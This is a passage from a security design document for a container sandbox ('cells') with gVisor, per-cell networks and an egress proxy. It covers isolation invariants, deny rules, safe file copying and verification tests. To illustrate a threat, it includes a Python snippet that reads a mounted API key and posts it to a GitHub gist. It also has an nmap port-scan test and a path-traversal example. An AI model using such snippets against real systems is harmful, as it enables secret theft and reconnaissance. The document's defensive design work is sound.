# Create two test networks and verify isolation
podman network create --internal test-net-a
podman network create --internal test-net-b
podman run --rm -d --network test-net-a --name test-a alpine sleep 60
podman run --rm --network test-net-b alpine ping -c1 -W2 test-a 2>/dev/null && {
  echo "FATAL: East-west traffic possible!"
  exit 1
}
echo "East-west isolation verified."
podman rm -f test-a 2>/dev/null || true
podman network rm test-net-a test-net-b 2>/dev/null || true
```

**Inter-cell coordination:** Goes out through proxy to external services:

| Pattern | Example | Allowlist |
|---------|---------|-----------|
| Message queue | Redis (hosted) | `*.upstash.io` |
| Shared storage | S3, GCS | `*.s3.amazonaws.com` |
| Webhook | Your API | `api.yourdomain.com` |

### Invariant 2: Proxy Cannot Be Abused as Gateway

**Problem:** Even with `ip_forward=0`, the proxy application could be tricked into fetching arbitrary resources.

**Rules:**

1. Proxy listens ONLY on port 8080 on the internal interface
2. CONNECT method allowed ONLY to port 443 (HTTPS)
3. CONNECT to literal IPs is blocked (domain allowlist only)
4. CONNECT to RFC1918/link-local/localhost/CGNAT is blocked
5. No upstream proxy chaining unless explicitly configured

**Proxy policy summary:**

```yaml
connect:
  allow_ports: [443]
  deny_ports: "*"  # everything else

deny_hosts:
  - type: ip_literal       # No direct IP access
  - type: cidr
    ranges: [10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 
             169.254.0.0/16, 100.64.0.0/10, 198.18.0.0/15, 240.0.0.0/4]
  - type: suffix
    values: [".onion", ".local"]
```

**Proxy configuration (mitmproxy addon):**

```python
# In allowlist addon
def request(self, flow):
    # Block CONNECT to non-443 ports
    if flow.request.method == "CONNECT":
        host, port = flow.request.host, flow.request.port
        if port != 443:
            flow.response = http.Response.make(403, "CONNECT only allowed to port 443")
            return
    
    # Block literal IPs
    if self.is_ip_address(flow.request.host):
        flow.response = http.Response.make(403, "Direct IP access not allowed")
        return
    
    # Block internal ranges
    if self.is_internal_range(flow.request.host):
        flow.response = http.Response.make(403, "Internal addresses not allowed")
        return
```

### Invariant 3: Secrets Are Observable, Not Preventable

**Reality:** A cell with access to secrets (via mounted files) can send them to any allowed domain:

```python
import os
import requests

# Cell can do this:
with open(os.environ["OPENAI_KEY_FILE"]) as f:  # From secrets: [openai-key]
    api_key = f.read().strip()
requests.post("https://api.github.com/gists", json={"content": api_key})
```

**What you can do:**

| Control | Effect |
|---------|--------|
| Proxy logging | You SEE the exfil (post-hoc) |
| Tight allowlist | Reduces exfil destinations |
| Alert on anomalies | Detect unusual POST to allowed domains |
| DLP in proxy | Scan bodies for secret patterns (complex) |

**What you cannot do:**
- Prevent a cell from reading its own environment
- Prevent a cell from sending data to allowed domains

**Recommendation:**
- Give cells only the secrets they need (minimal privilege via explicit declaration)
- No MITM by default (don't log request bodies)
- If MITM enabled, treat log storage as sensitive
- Rotate secrets if a cell behaves suspiciously

### Invariant 4: macOS State Directory Is Untrusted

**Problem:** Cells write to `~/.cells/state/*/workspace/`. These files end up on your Mac.

**Execution Policy:**

| Environment | Can Execute from /state? | Why |
|-------------|-------------------------|-----|
| **macOS host** | ❌ No | Protect you from malicious cell output |
| **Lima VM** | ✅ Yes | Needed for cell operations |
| **Cell containers** | ✅ Yes | Cells need to run scripts, venvs |

**macOS Protection Setup:**

```bash
# Create state directory with restricted permissions
mkdir -p ~/.cells/state
chmod 700 ~/.cells/state

# Add macOS quarantine flag to prevent accidental execution
xattr -w com.apple.quarantine "0181;$(printf %x $(date +%s));cell;$(uuidgen)" ~/.cells/state

# Optional: Use a separate macOS user account for state
# This provides stronger isolation
```

**Risks:**
- Malicious HTML with JavaScript (if opened in browser)
- Malicious Office docs with macros
- Scripts that look innocent but aren't
- Symlink attacks (cell creates symlink pointing outside workspace)
- `.app`, `.command`, `.webloc` can auto-execute on macOS
- Path traversal (`../../../etc/passwd`)

### `cell cp` Safety Rules

**Symlink handling:**

| Behavior | Default | Flag |
|----------|---------|------|
| Follow symlinks | ❌ No | `--follow-symlinks` to enable |
| Copy symlinks as-is | ❌ No | Symlinks are skipped by default |
| Warn on symlinks | ✅ Yes | Shows warning, skips file |

**Path validation:**

```bash
# cell cp enforces:
# 1. No path traversal
# 2. No absolute paths in archive
# 3. No special files
# 4. Destination must be in allowed directory

def validate_path(path):
    # Reject path traversal
    if '..' in path.split('/'):
        raise SecurityError("Path traversal not allowed")
    
    # Reject absolute paths
    if path.startswith('/'):
        raise SecurityError("Absolute paths not allowed")
    
    # Normalize and verify still within workspace
    normalized = os.path.normpath(path)
    if normalized.startswith('..'):
        raise SecurityError("Path escapes workspace")
    
    return normalized

def validate_file(path):
    import stat as stat_module
    file_stat = os.lstat(path)  # lstat doesn't follow symlinks
    
    # Reject symlinks
    if stat_module.S_ISLNK(file_stat.st_mode):
        raise SecurityError(f"Symlink not allowed: {path}")
    
    # Reject special files (devices, FIFOs, sockets)
    if not stat_module.S_ISREG(file_stat.st_mode) and not stat_module.S_ISDIR(file_stat.st_mode):
        raise SecurityError(f"Special file not allowed: {path}")
```

**`cell cp` behavior:**

```bash
# Default: safe copy with validation
cell cp my-cell:/work/output.json ./output.json
# - Validates path (no traversal)
# - Rejects symlinks
# - Rejects special files

# With sanitization: content-type filtering
cell cp --sanitize my-cell:/work/report.html ./report.html
# - All default validations
# - Blocks dangerous file types (.app, .command, etc.)
# - Warns on scripts (.sh, .py, etc.)
# - See V1 behavior table below for details

# Force mode: skip content-type safety checks (dangerous)
cell cp --force my-cell:/work/link.txt ./link.txt
# - Still validates paths (no traversal)
# - Allows symlinks (copies target content)
# - Skips file type blocking/warnings
# - Shows warning
```

**`cell cp --sanitize` V1 behavior (deterministic):**

Rather than promising "strip macros" (which requires complex tooling), V1 uses a simple allowlist/blocklist with **deterministic behavior** (no interactive prompts, safe for CI/automation):

| Action | File Types | Behavior |
|--------|------------|----------|
| **Block (hard)** | `.app`, `.command`, `.scpt`, `.dmg`, `.pkg`, `.webloc`, `.jar`, `.exe` | Refuse to copy, exit non-zero |
| **Block (soft)** | `.docx`, `.xlsx`, `.pptx`, `.pdf` | Refuse unless `--allow-office` |
| **Block (scripts)** | `.sh`, `.py`, `.js`, `.rb`, `.pl` | Refuse unless `--allow-scripts` |
| **Allow** | `.txt`, `.json`, `.csv`, `.md`, `.xml`, `.yaml`, `.log` | Copy directly |
| **Allow (images)** | `.png`, `.jpg`, `.gif`, `.svg`, `.webp` | Copy directly |

**Flags for CI/automation:**

```bash
# Default: block scripts and office docs
cell cp --sanitize my-cell:/work/output.json ./

# Allow scripts (e.g., you trust this cell's output)
cell cp --sanitize --allow-scripts my-cell:/work/script.py ./

# Allow office documents
cell cp --sanitize --allow-office my-cell:/work/report.docx ./

# Allow both
cell cp --sanitize --allow-scripts --allow-office my-cell:/work/ ./output/
```

**What V1 does NOT do:**
- Strip macros from Office documents (would require LibreOffice)
- Sanitize HTML (would require parser, easy to bypass)
- Scan for malware (would require antivirus integration)
- Interactive prompts (breaks automation)

**V1 philosophy:** Block obviously dangerous types, require explicit opt-in for risky types, allow data files. Deterministic behavior for CI/CD compatibility.

### VM Hygiene

The Lima VM is treated as **cattle, not pets**:

- VM is rebuildable: `cell vm recreate` 
- State persists on macOS (survives VM destruction)
- Consider wiping workspaces between sensitive cell runs: `cell workspace clean my-cell`

### Invariant 5: gVisor Must Be Active (No Silent Downgrade)

**Problem:** Using `--runtime=runc` removes kernel protection inside Lima.

**Rules:**

1. **Default runtime is gVisor** — set in containers.conf, not just CLI flag
2. **`cell list` shows runtime** — always visible which runtime a cell uses
3. **`--runtime=runc` requires `--unsafe` flag** — explicit acknowledgment
4. **Runtime is verified at startup** — don't rely solely on config defaults

**Implementation:**

```bash
# In containers.conf (Lima provisioning)
[engine]
runtime = "runsc"  # Default, not just available
```

```bash
# cell run enforces runtime verification (not just config trust):

# 1. Reject runc without --unsafe
if [ "$RUNTIME" = "runc" ] && [ "$UNSAFE" != "true" ]; then
    echo "ERROR: runc runtime requires --unsafe flag"
    exit 1
fi

# 2. After container starts, VERIFY actual runtime
# (Podman uses .OCIRuntime, not .HostConfig.Runtime like Docker)
ACTUAL_RUNTIME=$(podman inspect --format '{{.OCIRuntime}}' "$CELL_NAME")
if [ "$ACTUAL_RUNTIME" != "runsc" ] && [ "$UNSAFE" != "true" ]; then
    echo "ERROR: Container started with $ACTUAL_RUNTIME instead of runsc"
    echo "This may indicate containers.conf drift or override"
    podman rm -f "$CELL_NAME"
    exit 1
fi
```

**Why verify at runtime:** Podman's global config can drift (manual edits, package updates, config management). Verifying after container start ensures gVisor is actually active, not just configured.

### Invariant 6: Only Proxy May Attach to `proxy-external`

**Rule:** No container other than `proxy` may attach to `proxy-external`.

**Why this matters:** The `proxy-external` network has outbound internet access. Any container attached to it inherits the VM-level egress rules but bypasses per-cell isolation.

**Enforcement:**

```bash
# Verify only proxy is on proxy-external:
containers=$(podman network inspect proxy-external --format '{{range .Containers}}{{.Name}} {{end}}')
for c in $containers; do
  if [[ "$c" != "proxy" ]]; then
    echo "FATAL: Unexpected container '$c' on proxy-external network"
    exit 1
  fi
done
```

### Invariant 7: No Privileged Services on Cell Networks

**Rule:** Only the proxy container and the cell itself may connect to a cell's network. No other services.

**Why this matters:** If you accidentally connect a database, cache, or management service to a cell network, cells could attack it directly.

### Invariant 8: Cells Must Be Single-Homed (One Network Only)

**Rule:** Each cell container must be attached to exactly one network (its own `cell-<name>` network). Cells must never be attached to multiple networks.

**Why this matters:** Attribution relies on source subnet. If a container joins multiple networks (accidentally or maliciously via `--unsafe`), it may have multiple IP addresses. The proxy cannot reliably attribute traffic to the correct cell, and the cell may be able to reach unexpected destinations.

**Enforcement (in `cell verify`):**

```bash
verify_cell_single_homed() {
    local exit_code=0
    
    for cell in $(podman ps --format '{{.Names}}' | grep -v '^proxy$'); do
        network_count=$(podman inspect "$cell" --format '{{len .NetworkSettings.Networks}}')
        if [ "$network_count" -ne 1 ]; then
            echo "FATAL: Cell '$cell' is attached to $network_count networks (must be exactly 1)"
            exit_code=1
        fi
    done
    
    return $exit_code
}
```

**What to never do:**
- Run `podman network connect <other-network> <cell>`
- Use `--network` flags that attach a cell to multiple networks
- Create cells with `--unsafe` without understanding the implications

**Enforcement (in `cell verify`):**

```bash
# cell verify checks this invariant automatically:
verify_cell_networks() {
    local exit_code=0
    
    for net in $(podman network ls --format '{{.Name}}' | grep '^cell-'); do
        # Extract cell name from network name (cell-<name>)
        expected_cell="${net#cell-}"
        
        containers=$(podman network inspect "$net" --format '{{range .Containers}}{{.Name}} {{end}}')
        for c in $containers; do
            if [[ "$c" != "proxy" && "$c" != "$expected_cell" ]]; then
                echo "FATAL: Unexpected container '$c' on network '$net'"
                echo "       Only 'proxy' and '$expected_cell' should be attached"
                exit_code=1
            fi
        done
    done
    
    return $exit_code
}

# Run as part of cell verify
verify_cell_networks || exit 1
```

**`cell verify` runs this check automatically.** Run `cell verify` after any manual Podman operations.

**What to never do:**
- Connect a Redis/Postgres container to a cell network
- Connect a monitoring agent to a cell network  
- Connect the Lima VM host network to a cell network
- Run any "management" container on a cell network

### Invariant 9: Proxy Must Be Running Before Cells Start

**Rule:** `cell run` and `cell start` must verify the proxy is running and healthy before starting any cell.

**Why this matters:** If cells start without a running proxy, they will have no network path. This creates a confusing debugging experience.

**Enforcement:** See "How Cells Run" section — proxy check is the first step.

---

## Verify Invariants

`cell verify` is a fail-fast check that your safety guarantees are still true (especially after manual Podman operations).

It checks:
- Each `cell-<name>` network contains **only** the cell container and the proxy container
- The proxy is connected to `proxy-external` and has outbound connectivity
- Cells cannot reach the internet without the proxy
- The configured runtime is `runsc` unless `--unsafe` was explicitly used
- Each cell is attached to exactly one network (single-homed)
- Subnet allocator is within bounds

Example:

```bash
cell verify
cell verify --name bot-a
```

## Verification Tests

Run these to verify isolation is working correctly.

### Test 1: Cell Can't Reach Internet Directly

```bash
# IMPORTANT: Use --no-proxy-env to test without proxy environment variables
# This ensures we're testing the network topology, not just that the proxy works

cell run --name test-direct --rm --no-proxy-env -- curl -m 5 https://google.com
echo "Exit code: $?"  # MUST be non-zero (timeout or connection refused)

# Also verify that unset proxy env doesn't help
cell run --name test-direct2 --rm --no-proxy-env -- sh -c 'unset HTTP_PROXY HTTPS_PROXY; curl -m 5 https://google.com'
echo "Exit code: $?"  # MUST be non-zero
```

**If this succeeds, your network isolation is broken.** The `--internal` network should have no route to the internet.

### Test 2: Cell CAN Reach Internet Via Proxy

```bash
# This should SUCCEED (proxy env vars are set by default)
cell run --name test-proxy --rm -- curl -m 5 https://httpbin.org/ip
echo "Exit code: $?"  # Should be 0
```

### Test 3: Blocked Domain Is Blocked

```bash
# This should return 403 (assuming pastebin.com is in deny list)
cell run --name test-blocked --rm -- curl -s -o /dev/null -w "%{http_code}" https://pastebin.com
# Should print: 403
```

### Test 4: Cell Can't See Another Cell's Files

```bash
# Create a file in cell-a
cell run --name cell-a -d -- sh -c "echo 'secret' > /work/secret.txt && sleep 300"

# Try to read it from cell-b (should fail - each cell has its own workspace)
cell run --name cell-b --rm -- cat /work/secret.txt
# Should fail: file not found (cell-b's /work is empty, separate from cell-a's)

# Try to read via absolute path (should fail - /state is not mounted into cells)
cell run --name cell-b --rm -- cat /state/cell-a/workspace/secret.txt
# Should fail: /state directory doesn't exist inside the container
# (cells only see their own workspace at /work, not the host's /state directory)

# Cleanup
cell kill cell-a && cell rm cell-a
```

### Test 5: Cell Can't See Another Cell's Processes

```bash
# Start cell-a with a known process
cell run --name cell-a -d -- sleep 3600

# Check if cell-b can see it
cell run --name cell-b --rm -- ps aux
# Should only show cell-b's own processes, not cell-a's sleep

# Cleanup
cell kill cell-a && cell rm cell-a
```

### Test 6: No Foreign Containers Attached to Cell Networks

**Note:** These commands must be run inside the Lima VM. Use `cell vm shell` or prefix with `limactl shell cells --`.

```bash
# Should show only two containers per cell network: the cell container and proxy.
# Run inside VM:
cell vm shell -- bash -c '
for net in $(podman network ls --format "{{.Name}}" | grep "^cell-"); do
  echo "== $net =="
  podman network inspect "$net" --format "{{json .Containers}}"
done
'
```


### Test 7: gVisor Is Active

```bash
# Most reliable: check runtime via podman inspect (Podman format)
# Note: Podman uses .OCIRuntime, not .HostConfig.Runtime (Docker format)
# Run inside VM or via cell vm shell:
cell vm shell -- podman inspect my-cell --format '{{.OCIRuntime}}'
# Should output: runsc

# cell CLI wrapper (runs from macOS):
cell inspect my-cell --runtime
# Should output: runsc

# Verify from inside container:
cell run --name test-gvisor --rm -- cat /proc/version
# Should contain "gvisor"

# Alternative: gVisor restricts certain kernel interfaces
cell run --name test-gvisor --rm -- ls /sys/kernel/debug 2>&1
# Should fail or be empty (gVisor restricts this)
```

### Test 8: No East-West Traffic (Per-Cell Networks)

```bash
# Start cell-a on its own network with an HTTP server
cell run --name cell-a -d -- sh -c "python3 -m http.server 9000 || sleep 300"

# Start cell-b on its own network - try to reach cell-a by name
# This MUST FAIL - they're on different networks, DNS won't resolve
cell run --name cell-b --rm -- curl -m 5 http://cell-a:9000/
echo "Exit code: $?"  # MUST be non-zero (DNS failure or timeout)

# Create cell-c for IP-based testing
cell run --name cell-c -d -- sleep 300

# Even if cell-c knew cell-a's IP, it can't reach it (different network)
cell vm shell -- bash -c '
  CELL_A_IP=$(podman inspect cell-a --format "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}")
  echo "Cell A IP: $CELL_A_IP"
  
  # Test direct IP access from cell-c (should fail - no route)
  podman exec cell-c wget -q -O- -T 5 http://$CELL_A_IP:9000/ 2>&1 || echo "Direct IP blocked (expected)"
  
  # Via proxy MUST ALSO FAIL (proxy blocks internal IPs)
  podman exec cell-c sh -c "wget -q -O- -T 5 -e use_proxy=yes -e http_proxy=http://proxy:8080 http://$CELL_A_IP:9000/" 2>&1 || echo "Via proxy blocked (expected)"
'

# Cleanup
cell kill cell-a cell-c && cell rm cell-a cell-c
```

**If any of these succeed, your setup is broken.**

### Test 9: Proxy Only Exposes Port 8080

```bash
# Port scan the proxy from a cell - only 8080 should be open
# Install nmap in a test cell
cell run --name test-portscan --rm -- sh -c '
  apk add --no-cache nmap >/dev/null 2>&1
  nmap -p 1-65535 proxy --open -T4 2>/dev/null | grep "^[0-9]"
'
# Should output ONLY: 8080/tcp open  http-proxy
# If any other ports are open, the proxy is misconfigured

# Verify specific ports are closed
cell run --name test --rm -- curl -s -m 2 http://proxy:80/
# Expected: Connection refused

cell run --name test --rm -- curl -s -m 2 http://proxy:443/
# Expected: Connection refused

cell run --name test --rm -- curl -s -m 2 http://proxy:9090/  # metrics?
# Expected: Connection refused
```

### Test 10: Proxy Is Not a Gateway

```bash
# Try CONNECT to non-443 port via proxy (should be rejected)
cell run --name test --rm -- curl -s -x http://proxy:8080 http://example.com:8080/
# Expected: 403 Forbidden

# Try CONNECT to literal IP via proxy (should be rejected)
cell run --name test --rm -- curl -s -x http://proxy:8080 https://142.250.80.46/
# Expected: 403 Forbidden

# Try CONNECT to internal range via proxy (should be rejected)
cell run --name test --rm -- curl -s -x http://proxy:8080 http://10.50.0.1/
# Expected: 403 Forbidden

# Try CONNECT to CGNAT range (should be rejected)
cell run --name test --rm -- curl -s -x http://proxy:8080 http://100.100.100.100/
# Expected: 403 Forbidden
```

### Test 11: Default Runtime Check

```bash
# Run without specifying runtime (should use gVisor by default)
cell run --name test-default --rm -- cat /proc/version
# Should show gVisor

# Verify cell list shows runtime
cell list
# Should show "runsc" in runtime column for all cells

# Verify runc requires --unsafe
cell run --name test --runtime=runc -- echo hello
# Should fail with: "Error: runc runtime requires --unsafe flag"
```

### Test 12: IPv6 Is Disabled

```bash
# Try to use IPv6 (should fail - disabled in Lima VM)
cell run --name test-ipv6 --rm -- curl -6 -m 5 http://ipv6.google.com/
echo "Exit code: $?"  # MUST be non-zero

# Check that IPv6 is disabled
cell run --name test-ipv6 --rm -- cat /proc/sys/net/ipv6/conf/all/disable_ipv6
# Should output: 1
```

### Test 13: UDP to Internet Is Blocked

UDP to external hosts is blocked by network topology (internal network has no route).

**Note:** UDP *within* the cell's network (to the proxy) could theoretically work, but the proxy only listens on TCP. This test verifies cells can't bypass the proxy using UDP.

**Security note:** A malicious cell could attempt UDP-based fingerprinting or attacks against the proxy container's network stack. This is a known limitation; mitigate by keeping the proxy container minimal and updated.

```bash
# Try UDP DNS query to external resolver (should fail - no route)
cell run --name test-udp --rm --no-proxy-env -- nslookup google.com 8.8.8.8
echo "Exit code: $?"  # MUST be non-zero (no route to 8.8.8.8)

# QUIC/HTTP3 (UDP/443) should also fail to external hosts
cell run --name test-quic --rm --no-proxy-env -- curl --http3-only -m 5 https://cloudflare.com/
echo "Exit code: $?"  # MUST be non-zero (no UDP route to cloudflare)

# Verify TCP still works via proxy
cell run --name test-tcp --rm -- curl -m 5 https://cloudflare.com/
echo "Exit code: $?"  # Should be 0 (TCP via proxy)
```

### Test 14: Subnet Allocator Bounds

```bash
# Verify allocator rejects overflow (requires direct API call or mock)
cell vm shell -- python3 -c '
import json
# Simulate near-exhaustion
state = {"next_index": 255, "allocated": {}, "freed": []}
# Attempting to allocate should fail
if state["next_index"] > 254:
    print("PASS: Allocator correctly at limit")
else:
    print("FAIL: Allocator should reject index > 254")
'
```

### Test 15: Network Identity Correctness

```bash
# Create a cell and verify proxy sees correct subnet
cell run --name test-identity -d -- sleep 300

# Get expected subnet
EXPECTED_SUBNET=$(cell vm shell -- cat /state/system/subnets.json | jq -r '.allocated["test-identity"].subnet')
echo "Expected subnet: $EXPECTED_SUBNET"

# Make a request and check proxy log
cell exec test-identity -- curl -s https://httpbin.org/ip
sleep 1

# Check last log entry
cell vm shell -- tail -1 /var/log/cells/network/test-identity.jsonl | jq .
# Should show src_ip within expected subnet

# Cleanup
cell kill test-identity && cell rm test-identity
```

---

## Troubleshooting

### Cell can't reach internet

```bash
# Quick diagnosis
cell diagnose my-cell

# Manual checks:

# Check proxy is running
cell proxy status

# Check proxy can reach internet
cell vm shell -- podman exec proxy curl -m 5 https://example.com

# Test from cell with verbose output
cell exec my-cell -- curl -v http://proxy:8080/

# Check cell is on correct network
cell inspect my-cell --format '{{.NetworkSettings.Networks}}'

# Check last blocked requests
cell network my-cell --json | jq 'select(.blocked)' | tail -5
```

### Cell seems stuck

```bash
# Check logs
cell logs my-cell --stderr

# Check what it's doing
cell exec my-cell -- ps aux

# Check resource usage
cell stats my-cell
```

### gVisor compatibility issue

Some programs don't work with gVisor (rare). Check:

```bash
# View gVisor logs
cell vm shell -- journalctl -u podman -f | grep runsc

# Test without gVisor (less secure, for debugging only)
cell run --name test --runtime=runc --unsafe -- your-command
```

### Network isolation test fails

If Test 1 (direct internet) succeeds when it shouldn't:

```bash
# Verify network is internal (run inside VM via cell vm shell)
cell vm shell -- podman network inspect cell-xxx | grep -i internal

# Verify no gateway is set
cell vm shell -- podman network inspect cell-xxx | grep -i gateway

# Recreate the network
cell rm my-cell
cell run -f cells/my-cell.yaml
```

---

## Recovery Procedures

### Soft Reset (restart cells and proxy)

```bash
# Stop all cells gracefully
cell stop --all

# Restart proxy
cell proxy restart

# Restart all cells
cell start --all
```

### Hard Reset (kill everything, keep state)

```bash
# Kill all cells immediately
cell kill --all

# Stop proxy
cell proxy stop

# Clean up orphan networks
cell vm shell -- 'for net in $(podman network ls -q | grep "^cell-"); do podman network rm "$net" 2>/dev/null; done'

# Restart proxy
cell proxy start

# Restart cells
cell start --all
```

### VM Restart (preserves macOS state)

```bash
# Restart the Lima VM
cell vm restart

# This destroys:
# - All running containers
# - All cell networks
# - Runtime subnet mappings

# This preserves (on macOS):
# - Cell workspaces (~/.cells/state/)
# - Cell configs (~/.cells/cells/)
# - Secrets (~/.cells/secrets/)
# - Subnet allocator state (~/.cells/state/system/subnets.json)

# After VM restart (proxy starts automatically via systemd):
cell start --all  # Or specific cells
```

### VM Recreate (clean slate VM, preserves macOS state)

```bash
# Destroy and recreate the VM from scratch
cell vm recreate

# This runs:
# 1. limactl stop cells
# 2. limactl delete cells
# 3. limactl start cells (reprovisions from lima.yaml)

# All macOS data is preserved.
# All VM state is destroyed and rebuilt.

# After recreate:
cell start --all
# Cells need to be restarted (networks are recreated automatically)
```

### Full Reset (destroy everything)

```bash
# WARNING: This deletes all cell workspaces and state

# Stop VM
cell vm stop

# Delete all state on macOS
rm -rf ~/.cells/state/*

# Optionally delete configs and secrets too:
# rm -rf ~/.cells/cells/*
# rm -rf ~/.cells/secrets/*

# Recreate VM
cell vm recreate
```

### Verify Recovery

After any recovery, run verification tests:

```bash
# Quick smoke test
cell run --name recovery-test --rm -- curl -m 5 https://httpbin.org/ip

# Full verification suite
cell test isolation  # Runs all verification tests
```

---

## Optional Hardening (Future Roadmap)

These items are not required for V1 but may be considered for future versions or high-security deployments.

### AppArmor/Seccomp Profiles

Podman applies default seccomp profiles. For additional hardening:

```yaml
# In cell definition (future)
security:
  seccomp: strict  # More restrictive than default
  apparmor: cell-profile  # Custom AppArmor profile
```

### Air-Gap Mode

For complete network isolation:

```yaml
# In cell definition
network: none  # No network at all, not even to proxy
```

Or create a profile:

```bash
cell run --name airgap --network=none --image python:3.11-slim
```

### Egress Rate Limits

Prevent cells from flooding the proxy:

```yaml
# Future: in network-policy.yaml
rate_limits:
  per_cell:
    requests_per_minute: 1000
    bytes_per_minute: 100MB
```

### Per-Cell Proxy

For stronger isolation (at cost of complexity):

```yaml
# Future: in cell definition
proxy: dedicated  # Spin up a dedicated proxy for this cell
```

### Per-Cell MicroVMs

For the strongest isolation (requires Firecracker):

```yaml
# Future: in cell definition
isolation: microvm  # Each cell gets its own microVM
```

---

## Summary

| Goal | How |
|------|-----|
| Protect your Mac | Lima VM (hardware boundary) |
| Mitigate kernel exploits | gVisor (reduces syscall surface, defense in depth) |
| No east-west traffic | Per-cell networks (isolation by topology, not firewall rules) |
| Inter-cell communication | Out through proxy → external service → back through proxy |
| Enforce proxy (not bypassable) | `--internal` networks + proxy `ip_forward=0` + VM-level egress rules |
| Cell attribution | Subnet allocator (persistent state, hot-reloaded by proxy, IP in logs) |
| Block IPv6 | Disabled at Lima VM level (containers may show inet6 loopback but have no egress) |
| Block UDP to internet | Internal network topology (no route to external UDP endpoints) |
| Log all network traffic | Proxy with per-cell logging (metadata by default, bodies opt-in, redaction enforced) |
| HTTPS inspection | Opt-in MITM with per-cell CA mounting (not baked into images) |
| Secrets (minimal privilege) | Explicit declaration in cell definition; one file = one secret; VM paths standardized |
| macOS state protection | Quarantine attribute prevents Finder execution |
| Safe file export | `cell cp` validates paths, blocks symlinks/traversal; `--sanitize` blocks risky types |
| Long-running cells | Restart policies, log rotation with size caps, health checks |
| Resource limits | Memory, CPU, PIDs, file descriptors (ulimit) — both cells and proxy |
| Recovery | `cell vm recreate` rebuilds VM, preserves macOS state |
| Easy cell management | `cell run/stop/logs/files/cp` |
| Failure diagnosis | `cell diagnose` for connectivity issues |

**Network rules:**
- Each cell gets its own `--internal` network (no east-west by topology)
- Proxy joins all cell networks; is the only allowed bridge
- Cells cannot reach the internet without going through the proxy
- Cells cannot reach each other (different networks, proxy blocks internal IPs including CGNAT)
- Proxy egress restricted at VM level (80/443 only, fail-closed)
- Inter-cell coordination goes out and comes back in — fully logged

**Secrets rules:**
- Cells explicitly declare which secrets they need in their definition
- Cell gets only declared secrets (minimal privilege)
- `grep -r "secrets:" ~/.cells/cells/` shows who gets what
- Secret values stay in `~/.cells/secrets/*.txt`, not in YAML

**Self-testing:** 
- Provisioning verifies: east-west isolation, internal network has no internet, external network works, gVisor active
- Verification tests: `cell test isolation` or manual tests in this document

**Defense in depth:**
1. Lima VM protects macOS (hardware boundary)
2. gVisor reduces kernel attack surface inside Lima
3. Per-cell networks eliminate east-west traffic by topology
4. Proxy application enforces policy (allowlist, block internal IPs, redact credentials)
5. VM-level iptables restrict proxy outbound (fail-closed, ESTABLISHED/RELATED allowed)
6. macOS quarantine prevents accidental execution of cell outputs
7. Pinned proxy image digest prevents supply chain attacks
8. Resource limits (memory, CPU, PIDs, file descriptors) prevent resource exhaustion
9. Proxy-before-cells ordering prevents silent network failures
10. Concurrent-safe logging prevents log corruption
